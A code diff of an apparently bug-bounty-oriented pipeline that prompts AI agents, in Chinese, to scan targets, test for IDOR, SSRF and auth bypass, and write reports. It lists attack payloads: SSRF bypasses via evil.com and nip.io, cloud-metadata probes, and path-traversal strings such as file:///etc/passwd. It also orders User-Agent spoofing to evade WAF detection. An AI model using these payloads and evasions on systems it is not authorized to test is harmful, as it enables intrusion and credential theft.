-dirsearch -u "<target_url>" ${PROXY_DIRSEARCH_FLAG} \
+\`\`\`bash
+cat /home/my/.local/lib/python3.14/site-packages/dirsearch/db/dicc.txt /tmp/dirsearch_custom.txt | sort -u > /tmp/merged_dict.txt
+dirsearch -u "<target_url>" \
   -w /tmp/merged_dict.txt \
   -e php,asp,aspx,jsp,html,js,json,xml,txt,sql,conf,zip,tar.gz,bak,old,log \
   -t 10 --timeout=5 \
   -o /tmp/dirsearch_results.txt --format plain 2>&1 | tail -50
-\**\**\`
+\`\`\`
 
-**Step 4: 解析运行结果**
+**Step 3: 解析运行结果**
 读取 /tmp/dirsearch_results.txt，提取所有状态码为 200/301/401/403 的端点。
 
-**Step 5: 对发现的端点做快速验证（确认非空页面）**
+**Step 4: 对发现的端点做快速验证（确认非空页面）**
 对每个200端点，用 curl -s -o /tmp/verify.html -w "%{http_code}" 获取响应体，
 检查文件大小 > 100字节才视为有效发现。
 
 **输出要求：**
 只记录确认有效的端点。每个发现附带: endpoint, status_code, source（dirsearch内置/积累字典/混合）
-命中WAF的目标必须写入 waf_detected，表示已识别防护并跳过dirsearch。
 同时在 new_endpoints 中输出本次新发现的可积累端点。
 
       ${UA_INSTR}
@@ -1292,28 +1099,10 @@ dirsearch -u "<target_url>" ${PROXY_DIRSEARCH_FLAG} \
             items: { type: 'string' },
             description: '本次新发现的可用端点，用于更新字典本',
           },
-          waf_detected: {
-            type: 'array',
-            items: {
-              type: 'object',
-              properties: {
-                target: { type: 'string' },
-                evidence: { type: 'string' },
-                action: { type: 'string', enum: ['skipped_dirsearch'] },
-              },
-              required: ['target', 'evidence', 'action'],
-            },
-            description: '检测到WAF/安全防护并跳过dirsearch的目标',
-          },
         },
         required: ['findings'],
       }, phase: '漏洞挖掘' }
     )
-
-    if (p3_dirsearch && p3_dirsearch.waf_detected && p3_dirsearch.waf_detected.length > 0) {
-      log(`  🛡️ WAF/安全防护目标 ${p3_dirsearch.waf_detected.length} 个，已跳过dirsearch:`)
-      p3_dirsearch.waf_detected.forEach(w => log(`    🛡️ ${w.target} — ${w.evidence}`))
-    }
 
     if (p3_dirsearch && p3_dirsearch.findings && p3_dirsearch.findings.length > 0) {
       log(`  目录扫描发现 ${p3_dirsearch.findings.length} 个端点:`)
@@ -1335,7 +1124,6 @@ ${p3_dirsearch.new_endpoints.map(function(e) { return '  - ' + e }).join(String.
       ;(targets || []).forEach(t => dimTracker.record(t.url, 'dirsearch_scan', 'done'))
     } else {
       log('  目录扫描: 未发现新端点')
-    }
     }
 
     // dirsearch发现的端点 → 注入到unauth_test上下文
@@ -1369,7 +1157,7 @@ ${targets.map(function(t) { return '  ' + t.priority + ' | ' + t.url + ' | tags:
 ${allUrls.map(function(u) { return '  ' + u }).join('\\n')}
 
 第2阶段JS逆向发现的隐藏端点/API路径:
-${p2_discoveries_text != null && p2_discoveries_text !== '' ? p2_discoveries_text.substring(0, 10000) : typeof p2_discoveries_text === 'string' ? '（JS分析了但无发现）' : '（无 JS 分析数据）'}
+${p2_discoveries_text ? p2_discoveries_text.substring(0, 10000) : '（无 JS 分析数据）'}
 
 **【Phase 2 提取的结构化凭证（优先级高 — 结构化数据优先于下方文本描述）】**
 ${typeof globalThis.__p2_creds_json !== 'undefined' ? '以下凭证可直接用于越权/认证测试:\n' + JSON.stringify(JSON.parse(globalThis.__p2_creds_json).slice(0, 15), null, 2).substring(0, 2000) : '（无结构化凭证提取）'}
@@ -1378,116 +1166,46 @@ ${typeof globalThis.__p2_creds_json !== 'undefined' ? '以下凭证可直接用�
 **【Phase 2 JS缓存目录 — 可回查阅本地JS/还原源码】**
 ${typeof globalThis.__p2_js_dirs_json !== 'undefined' ? 'JS文件已下载到本地，可直接Read查阅:\n' + JSON.parse(globalThis.__p2_js_dirs_json).map(d => '  ' + d.dump_dir + ' (' + d.js_count + '个JS文件' + (d.has_reconstructed ? ', 含还原源码 reconstructed/' : '') + ')').join('\n') : '（无本地缓存）'}
 
-**【Phase 2 结构化 Call Site 请求参数 — 优先级最高】**
-${formatStructuredCallSiteContext('__p2_call_sites_json')}
-
-${PARAM_DRIVEN_TESTING_GUIDE}
 
 测试矩阵（按优先级执行）:
 
-	**【核心策略 — 🎯 Agent 发散思维 + 靶标定制】**
+**【核心策略 — 🎯 Agent 发散思维 + 靶标定制】**
 
-	**🎯 核心原则：基于请求参数决定漏洞测试方向，而非API路径名。**
+**首先思考：这个系统做什么的？数据流？鉴权怎么实现的？哪个模块最可能有漏洞？**
+基于 Phase 2 的 JS 分析 + 框架识别 + 发现的 API 路径，用第一性原理推断：
+- 物流平台 → 关注订单/运单/用户API的越权和遍历
+- 管理后台 → 关注权限提升/未授权/配置泄露
+- API网关 → 关注SSRF/路径穿越/鉴权绕过
+- **先理解系统再动手，不要机械照搬路径列表**
 
-	Phase 2 的 JS 分析已经提取了每个 API 端点的调用现场参数结构。收到 API 端点列表后，对每个端点按以下两级策略执行：
+不要只测固定路径列表。对于从 JS 发现的 API 路径，先分析命名再选择测试手法：
 
-	---
+1. 分析 API 命名 → 推断功能 → 对应攻击:
+   upload/file/import/attachment       → **文件上传绕过/任意文件写入**
+   download/export/backup/fetch        → **路径遍历/任意文件读取**
+   order/payment/bill/account/balance  → **IDOR越权（替换id/userId参数）**
+   login/auth/token/session            → **认证绕过/弱口令/JWT伪造**
+   admin/manager/console/dashboard     → **垂直越权/权限提升**
+   config/settings/env/param           → **配置泄露/敏感信息**
+   sql/search/query/select             → **SQL注入/SSTI**
+   exec/run/command/shell/exec     → **命令执行/RCE**
+   delete/drop/remove/clear            → **未授权删除**
+   page/list/search/query              → **批量遍历/未授权敏感数据**
 
-	### 🔸 第一级：Call Site 参数驱动（最高优先级 — 根据JS分析到的请求参数字段名决定漏洞方向）
+2. 根据参数名判断测试方向:
+   id/userId/orderId → 替换遍历看响应变化
+   file/path/url     → 路径穿越(../)、SSRF
+   page/pageSize     → 分页遍历
+   callback/jsonp    → XSS/JSON劫持
+   redirect/next/url → 开放重定向
+   data/html/content → XSS/富文本注入
 
-	**收到的 Phase 2 分析结果中包含了每个端点的「请求参数字段名列表」**（如 **/apix/image-colors: {url, width?, height?}**）
-
-	如果该端点有明确的请求参数字段名数据 → **完全基于参数字段名决定漏洞测试方向**，而不是API路径名：
-
-	| 请求参数中的字段名 | 对应的漏洞测试方向 |
-	|---|---|
-	| **url**, **image_url**, **file_url**, **src**, **href**, **link**, **download_url**, **redirect** | **SSRF**（IPv6绕过**[::1]**/**[0:0:...:ffff:127.0.0.1]**）+ **路径穿越****../** |
-	| **file**, **file_path**, **path**, **filename**, **download**, **template_path** | **路径遍历/任意文件读取** |
-	| **content**, **html**, **markdown**, **template**, **body**, **message**, **render** | **XSS/SSTI模板注入** |
-	| **page**, **limit**, **offset**, **pageSize**, **pageNum**, **start**, **end** | **批量数据遍历/未授权分页访问** |
-	| **id**, **userId**, **orderId**, **studentId**, **companyId**, **appId**, **key** | **IDOR水平越权**（替换id值遍历） |
-	| **price**, **amount**, **quantity**, **discount**, **coupon**, **total** | **逻辑漏洞/金额篡改/优惠券滥用** |
-	| **data**, **xml**, **json**, **document**, **payload** | **XXE/注入/反序列化** |
-	| **redirect**, **callback**, **next**, **forward**, **returnUrl**, **referer** | **开放重定向/SSRF** |
-	| **token**, **accessToken**, **sessionKey**, **apiKey**, **secret** | **Token伪造/越权/凭证泄露** |
-	| **image**, **video**, **media**, **file**, **attachment**, **upload** | **文件上传绕过/任意文件写入/SSRF** |
-	| **command**, **cmd**, **exec**, **shell**, **code**, **expression** | **命令执行/表达式注入/RCE** |
-
-	**关键认知**：同一个端点名可能对应完全不同的漏洞类型，取决于它收什么参数：
-	- **/apix/image-colors** 若参数含 **url** → 测 **SSRF**
-	- **/apix/generate-avatar** 若参数含 **template** → 测 **SSTI**
-	- **/apix/data/export** 若参数含 **id** → 测 **IDOR**；若含 **file** → 测 **路径遍历**
-
-	**针对每个端点的测试步骤：**
-	1. 看它的参数字段名列表 → 从上方映射表找到对应的漏洞类型
-	2. 对每个参数名做相应的攻击测试
-	3. **如果某个参数的含义是"让服务端去获取外部资源"（url/image_url/href等）→ 必须测 SSRF**
-	4. **SSRF测不了 → 再测参数注入/越权/其他**
-
-	---
-
-	### 🔸 第二级：按API路径名推断（兜底 — 当Phase 2未提供call site参数结构时使用）
-
-	当无JS call site数据或不明确参数结构时，才按API路径名推断：
-
-	1. 分析 API 命名 → 推断功能 → 对应攻击:
-	   upload/file/import/attachment       → **文件上传绕过/任意文件写入**
-	   download/export/backup/fetch        → **路径遍历/任意文件读取**
-	   order/payment/bill/account/balance  → **IDOR越权（替换id/userId参数）**
-	   login/auth/token/session            → **认证绕过/弱口令/JWT伪造**
-	   admin/manager/console/dashboard     → **垂直越权/权限提升**
-	   config/settings/env/param           → **配置泄露/敏感信息**
-	   sql/search/query/select             → **SQL注入/SSTI**
-	   exec/run/command/shell/exec         → **命令执行/RCE**
-	   delete/drop/remove/clear            → **未授权删除**
-	   page/list/search/query              → **批量遍历/未授权敏感数据**
-
-	---
-
-	### 🔸 第三级：兜底检测 — 响应体反向推断参数 + 通用路径扫描
-
-	**对于所有 POST 端点，即使不知道请求参数结构也做以下操作：**
-
-	a) **响应体反向推断**：发一个空POST body → 看错误响应中是否提示期望字段
-	   - 返回 **{"error": "missing field 'imageUrl'"}** → 说明参数含 imageUrl
-	   - 返回 **{"msg": "url不能为空"}**` → 说明有 url 参数，SSRF机会
-	   - 返回 **{"error": "file not found"}** → 说明有 file/path 参数
-
-	b) **通用路径探测**（始终执行）:
-	   - API文档: /swagger-ui.html, /v3/api-docs, /doc.html
-	   - 配置: /.env, /actuator, /actuator/heapdump
-	   - 备份: .bak, .old, ~, .swp
-
-	---
-
-	### 🔸 第四级：协议级绕过与原理推理（当标准测试被拦截时使用）
-
-	**如果标准测试返回403/被WAF拦截/接口无响应 → 不要放弃，从漏洞原理和请求参数出发推理绕过：**
-
-	1. **SSRF绕过（当url/image_url等参数被防护）**:
-	   - IPv6绕过黑名单: **http://[::1]:8080**, **http://[0:0:0:0:0:ffff:127.0.0.1]:8080**, **http://[::ffff:7f00:1]:8080**
-	   - DNS重绑定: **http://127.0.0.1.nip.io:8080**, **http://1.0.0.127.nip.io:8080**
-	   - URL解析差异: **http://127.0.0.1:8080@evil.com**, **http://evil.com#@127.0.0.1**, **http://evil.com/../127.0.0.1/**
-	   - 短链接/302跳绕过: 自己搭一个302跳转到内网地址的外部域名
-	   - 云元数据IPv6: **http://[fd00:ec2::254]/latest/meta-data/**
-
-	2. **路径穿越绕过（当file/path参数被过滤）**:
-	   - URL编码: **%2e%2e%2f**, **..%252f**, **....//....//**
-	   - Unicode/UTF-8变体: **．．／**, **%c0%ae%c0%ae%c0%af**
-	   - 协议混合: **file:///etc/passwd**, **php://filter/convert.base64-encode/resource=**
-
-	3. **WAF绕过（整体）**:
-	   - 大小写混写: **SQL -> sQl**, **<Script>**
-	   - 参数污染: **id=1&id=2**, **id=1&id[]=2**
-	   - Content-Type切换: JSON ↔ form-urlEncoded ↔ XML
-	   - 编码绕过: Base64、Unicode、双URL编码
-
-	4. **第一性原理推演**（每次绕过尝试前必须执行）:
-	   - 这个参数最终会进入哪段逻辑？(数据库查询/文件系统/HTTP请求/模板引擎/命令执行)
-	   - 后端可能怎么校验输入？(黑名单/白名单/类型校验/长度校验)
-	   - 校验在哪一层？(WAF/API网关/应用层代码) → 层间解析差异即绕过机会
-	   - 如果我是开发，会怎么防御？→ 在防御的盲区寻找突破口
-
+3. SSRF专项测试（参数含 url/path/redirect/domain/host/target）:
+   - 替换为内网地址: http://127.0.0.1:8080, http://10.0.0.1, http://172.16.0.1
+   - 云元数据: http://169.254.169.254/latest/meta-data/（AWS/阿里云）
+   - 华为云元数据: http://169.254.169.254/openstack/latest/
+   - 内部服务探测: http://localhost:6379(Redis), http://localhost:3306(MySQL)
+   - 观察响应差异: 超时vs拒绝vs返回数据 = 内网服务存活
 
 4. 组件版本识别 + CVE比对:
    - 识别组件指纹（从响应头Server/X-Powered-By/body中的版本号）
@@ -1524,7 +1242,7 @@ ${PARAM_DRIVEN_TESTING_GUIDE}
       ⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**
 
       ⚠️ **严格边界规则：仅对目标列表中的URL进行测试。不要读取任何本地文件。不要引用、提及或包含任何其他厂商的数据。**`,
-      { label: **🔓 未授权/信息泄露测试**, schema: {
+      { label: `🔓 未授权/信息泄露测试`, schema: {
         type: 'object',
         properties: {
           findings: {
@@ -1565,18 +1283,13 @@ ${PARAM_DRIVEN_TESTING_GUIDE}
 ${targets.map(function(t) { return '  ' + t.url }).join('\\n')}
 
 第2阶段JS逆向发现的隐藏端点/API路径:
-${p2_discoveries_text != null && p2_discoveries_text !== '' ? p2_discoveries_text.substring(0, 10000) : typeof p2_discoveries_text === 'string' ? '（JS分析了但无发现）' : '（无 JS 分析数据）'}
+${p2_discoveries_text ? p2_discoveries_text.substring(0, 10000) : '（无 JS 分析数据）'}
 
 第2阶段提取的结构化凭证:
 ${typeof globalThis.__p2_creds_json !== 'undefined' ? JSON.stringify(JSON.parse(globalThis.__p2_creds_json).slice(0, 10), null, 2) : '（无）'}
 
 JS缓存目录（可回查本地JS/还原源码）:
 ${typeof globalThis.__p2_js_dirs_json !== 'undefined' ? JSON.parse(globalThis.__p2_js_dirs_json).map(d => d.dump_dir + (d.has_reconstructed ? ' (含还原源码)' : '')).join('\n') : '（无）'}
-
-Phase 2结构化Call Site请求参数（优先级最高）:
-${formatStructuredCallSiteContext('__p2_call_sites_json')}
-
-${PARAM_DRIVEN_TESTING_GUIDE}
 
 1. 越权测试:
    - 对含数字ID的路径，尝试替换ID值
@@ -1625,7 +1338,7 @@ ${PARAM_DRIVEN_TESTING_GUIDE}
       ⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**
 
       ⚠️ **严格边界规则：仅对目标列表中的URL进行测试。不要读取任何本地文件。不要引用、提及或包含任何其他厂商的数据。**`,
-      { label: **🎯 越权/弱口令测试**, schema: {
+      { label: `🎯 越权/弱口令测试`, schema: {
         type: 'object',
         properties: {
           findings: {
@@ -1776,8 +1489,6 @@ if (progress.findings_count === 0) {
     ...(typeof p3_unauth !== 'undefined' && p3_unauth?.findings ? p3_unauth.findings : []),
     ...(typeof p3_other !== 'undefined' && p3_other?.findings ? p3_other.findings : []),
     ...(typeof p3_quick !== 'undefined' && p3_quick?.findings ? p3_quick.findings : []),
-    ...(typeof p3_dirsearch !== 'undefined' && p3_dirsearch?.findings ? p3_dirsearch.findings : []),
-    ...(typeof p3_codeaudit !== 'undefined' && p3_codeaudit?.audit_findings ? p3_codeaudit.audit_findings : []),
   ]
   const p4_findings_json = JSON.stringify(p4_all_findings, null, 2)
 
@@ -1799,8 +1510,8 @@ ${p4_findings_json.substring(0, 6000)}
 - 如果完全无法提取可测试 URL → 标记为 needs_manual_test
 
 **Step 2: 用 curl 测试**
-1. 先 \**curl -sk -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -o /dev/null -w "%{http_code}"\** 获取数字HTTP状态码（必须带浏览器UA）
-2. 状态码 200/401/403 的，\**curl -sk -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\** 获取响应体
+1. 先 \`curl -sk -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -o /dev/null -w "%{http_code}"\` 获取数字HTTP状态码（必须带浏览器UA）
+2. 状态码 200/401/403 的，\`curl -sk -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\` 获取响应体
 3. 对比 带Cookie vs 无Cookie 的响应差异
 4. **http_status 必须是数字，不能是字符串。每个 confirmed/suspected 发现都必须有。**
 
@@ -1839,30 +1550,11 @@ Step C: 如果响应是 JSON → 提取 d.get('data') 判断类型:
 输出时 confirmed_findings 只放 confirmed + suspected 的。false_positives 和 needs_manual_test 各自归位。
 
 ---
-**Phase 2结构化Call Site请求参数（验证和发散时必须优先回查）**
-${formatStructuredCallSiteContext('__p2_call_sites_json')}
-
-${PARAM_DRIVEN_TESTING_GUIDE}
-
 ### 🎯 Step 4: Agent 发散扩展（关键思维环节 — 不要跳过）
 
 **验证一个发现时，发散思考是否存在变种/扩展，不要只复述已有发现。**
 
 发散方向（对每个发现依次思考）：
-
-**0. 信息流协同 — 验证前先扫描当前对话中的上下文（最高优先级）**
-当你接收到一个 API 端点时，**不要孤立测试**，先在当前信息流中搜索与该端点相关的所有已知信息：
-- **查 Phase 2 JS 分析结果**：该端点的 call site 参数结构是什么？（即 {url, width?, height?} 这样的字段列表）
-  - 如果有字段列表 → 直接按字段名决定漏洞测试方向（每个字段名映射一个漏洞类型）
-- **查 Phase 3 已有结论**：该端点之前是否已经被测试过？结论是什么？
-- **查 **_credentials.json****：该端点涉及的凭证信息（oken/API Key等）是否已被提取？
-- **查 fuzz 结果**：该端点的子路径或变体是否已被发现？
-- **联合判定**：如果你发现该端点的 JS call site 定义了参数 **url: string** → 无论端点名是什么，都必须测 SSRF
-- 结论：**不要只看端点路径名判断漏洞类型，要看构建请求包时传了哪些参数**
-
-**0b. 响应体逆向推断参数（当JS分析未提供call site参数时）**
-- 对 POST 端点发送空 body → 看错误响应是否提示期望字段
-- 例：返回 **{"missing":"imageUrl"}** → 字段含 imageUrl，SSRF机会
 
 **4a. 参数发散 — 同一端点的其他参数**
 发现 /api/user?id=1 → 发散试:
@@ -1898,17 +1590,8 @@ JSON → Form-URLEncoded（参数解析差异）
 如果 Phase 2 发现了隐藏API路径或凭证，思考这些路径是否存在与当前发现类似的漏洞模式。
 访问本地JS文件确认（路径见上方JS缓存目录）。
 
-**4g. 原理级绕过发散（当标准测试被WAF/防护拦截时 — 关键思维能力）**
-如果直接测试被 WAF/防护/校验拦截（403/400/拦截页面），必须从原理推理绕过：
-- SSRF 被拦截 → IPv6映射 **[::1]**/DNS重绑定 **127.0.0.1.nip.io**/URL解析差异 **127.0.0.1#@evil.com**
-- 路径穿越被拦截 → URL双编码 **..%252f**/Unicode变体 **．．／**/协议混合 **file://**
-- SQL注入被拦截 → 大小写混写/参数污染/编码绕过
-- **核心推理链路**：这个参数最终传给什么函数？那个函数接受的合法格式是什么？绕过就在合法格式与黑名单之间的间隙
-- **如果当前手段绕不过 → 回溯到参数本身**：换个参数尝试、换个HTTP方法、换个Content-Type、加个Header
-
-**4h. 利用链思考 — 当前发现能否与其他发现串联**
+**4g. 利用链思考 — 当前发现能否与其他发现串联**
 存在利用链可能 → 报告时标记为利用链格式
-
 
 **Step 5: 变种验证**
 对 Step 4 发散出的每个有潜力的变种，用 curl 快速验证状态码。
@@ -2101,11 +1784,11 @@ log(`  复测完成: ${p4_verify.confirmed_findings.length} 个确认有效${fp_
         const suspectedEndpoints = new Set(
           p4_verify.confirmed_findings.filter(f => f.confidence === 'suspected' || !f.curl_command).map(f => f.endpoint)
         )
-        const fpEndpoints = new Set((p4_verify.false_positives || []).map(f => f.endpoint || f.title))
-        const manualKeys = new Set((p4_verify.needs_manual_test || []).map(f => f.title))
+        const fpEndpoints = new Set((p4_verify.false_positives || []).map(f => f.title))
+        const manualTitles = new Set((p4_verify.needs_manual_test || []).map(f => f.title))
         p3_findings_data = p3_findings_data.map(f => {
-          if (fpEndpoints.has(f.endpoint || f.title)) return { ...f, status: 'false_positive', phase_discovered: 'phase4' }
-          if (manualKeys.has(f.title)) return { ...f, status: 'needs_manual_test', phase_discovered: 'phase4' }
+          if (fpEndpoints.has(f.title)) return { ...f, status: 'false_positive', phase_discovered: 'phase4' }
+          if (manualTitles.has(f.title)) return { ...f, status: 'needs_manual_test', phase_discovered: 'phase4' }
           if (confirmedEndpoints.has(f.endpoint)) return { ...f, status: 'confirmed', phase_discovered: 'phase4' }
           if (suspectedEndpoints.has(f.endpoint)) return { ...f, status: 'suspected', phase_discovered: 'phase4' }
           return f
@@ -2119,9 +1802,8 @@ log(`  复测完成: ${p4_verify.confirmed_findings.length} 个确认有效${fp_
             if (m) f.http_status = parseInt(m[1] || m[2] || m[3])
           }
           if (!f.http_status && f.curl_command) {
-            // 有curl命令但无状态码 → 从 curl -w 输出或响应中提取
-            const statusMatch = f.curl_command.match(/HTTP[/\d.]*\s+(\d{3})/)
-            if (statusMatch) f.http_status = parseInt(statusMatch[1])
+            const m = f.curl_command.match(/-w[=% ]"?%{http_code}"?/)
+            if (m) f.http_status = 200  // 有curl命令但无状态码，默认200
           }
           if (!f.http_status) f.http_status = 0  // 实在提取不到就标0
         })
@@ -2290,18 +1972,14 @@ if (progress.findings_count === 0) {
   )
   log(`  已有 ${(existingReports || '').split('\n').filter(Boolean).length} 个报告`)
 
-  // 报告只优先使用 Phase 4 复测后的有效发现，避免把 Phase 3 原始误报写入报告。
-  const p6VerifiedFindings = (p4_verify?.confirmed_findings || []).filter(f =>
-    f.confidence === 'confirmed' || f.confidence === 'suspected' || !f.confidence
-  )
-  const p6FallbackFindings = [
+  // 汇总所有阶段的结构化发现
+  const allFindingsData = [
     ...(typeof p3_unauth !== 'undefined' && p3_unauth?.findings ? p3_unauth.findings : []),
     ...(typeof p3_other !== 'undefined' && p3_other?.findings ? p3_other.findings : []),
     ...(typeof p3_quick !== 'undefined' && p3_quick?.findings ? p3_quick.findings : []),
     ...(typeof p3_dirsearch !== 'undefined' && p3_dirsearch?.findings ? p3_dirsearch.findings : []),
     ...(typeof p3_codeaudit !== 'undefined' && p3_codeaudit?.audit_findings ? p3_codeaudit.audit_findings : []),
   ]
-  const allFindingsData = p6VerifiedFindings.length > 0 ? p6VerifiedFindings : p6FallbackFindings
   const findingsJSON = JSON.stringify(allFindingsData, null, 2)
 
   // 用结构化schema让agent返回【报告规划】（仅分片规划，不生成内容）
@@ -2381,15 +2059,6 @@ ${existingReports}` : ''}
     log(`  规划写入 ${p5_plan.reports.length} 份报告...`)
     progress.reports_count = p5_plan.reports.length
 
-    // 预读报告模板（避免N个并行writer各自独立Read，浪费token）
-    let p5_template_content = ''
-    try {
-      p5_template_content = require('fs').readFileSync('${SKILL_SCRIPTS}/../references/report-templates.md', 'utf8')
-      log(`  📖 预读报告模板 (${p5_template_content.length} 字符)`)
-    } catch(e) {
-      log(`  ⚠️ 预读报告模板失败: ${e.message}，writer将自行Read`)
-    }
-
     // 按严重等级分批注入，让writer知道上下文
     const severityOrder = { '严重': 0, '高危': 1, '中危': 2, '低危': 3, '信息': 4 }
 
@@ -2425,9 +2094,8 @@ ${myFindingsJSON}
 4. 读取文件内容确认完整性
 
 报告格式要求：
-- 模板结构参考:
-${p5_template_content ? '``**\n' + p5_template_content.substring(0, 1500) + '\n**``' : '（模板预读失败，请自行Read）'}
-- 如果该报告是**利用链类型**（多个漏洞串联），使用攻击链路图格式：\**漏洞A -> 漏洞B -> 漏洞C -> 最终危害\**，每个步骤附带单独的请求/响应包
+- 先用Read工具读取 ${SKILL_SCRIPTS}/../references/report-templates.md 了解标准模板结构
+- 如果该报告是**利用链类型**（多个漏洞串联），使用攻击链路图格式：\`漏洞A -> 漏洞B -> 漏洞C -> 最终危害\`，每个步骤附带单独的请求/响应包
 - 包含漏洞信息表（名称、等级、类型、范围、发现时间）
 - 包含漏洞描述
 - 包含漏洞复现步骤 + 完整的HTTP请求/响应包 + curl命令
@@ -2630,7 +2298,6 @@ const p7_final = await agent(
 
 3. 漏洞URL复测:
    提取每份报告中的漏洞URL，用 curl -sI -H 'User-Agent: Mozilla/5.0 ...' 确认当前仍可访问且返回200（必须带浏览器UA）
-   ${UA_INSTR}
 
 4. HTML版本确认:
    ls "${SRC_BASE}/${companyName}/submittable_reports/reports_html/"*.html
@@ -2673,4 +2340,4 @@ log('╚════════════════════════
 showProgress()
 
 // Final return
-return { company: companyName, mode: mode, done: true, proxy_enabled: Boolean(workflowProxyUrl), proxy: workflowProxyUrl || null, skip_dirsearch: skipDirsearch }
+return { company: companyName, mode: mode, done: true }
